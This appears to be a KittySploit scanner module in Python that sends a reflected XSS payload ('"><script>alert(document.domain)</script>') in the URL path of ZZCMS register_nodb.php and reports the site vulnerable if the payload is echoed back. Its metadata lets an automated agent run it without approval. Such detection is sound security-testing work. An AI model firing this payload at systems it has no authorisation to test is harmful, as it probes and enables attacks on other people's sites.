#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Identified a reflected Cross-Site Scripting (XSS) vulnerability in register_nodb."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Zzcms `register_nodb.php` - Cross Site Scripting Detection',
        'description': 'Identified a reflected Cross-Site Scripting (XSS) vulnerability in register_nodb.php of ZZCMS, which allowed injection of malicious scripts via user-supplied input.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'xss', 'zzcms', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://github.com/Sinon2003/cve/blob/main/zzcms/xss-register_nodb.php.md'],
    }

    def run(self):
        path = '/3/ucenter_api/code/register_nodb.php/"><script>alert(document.domain)</script>'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('"><script>alert(document.domain)</script>', 'example=register',)
        ctype_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='medium',
                reason='Zzcms `register_nodb.php` - Cross Site Scripting detected',
                path=path,
            )
            return True
        return False

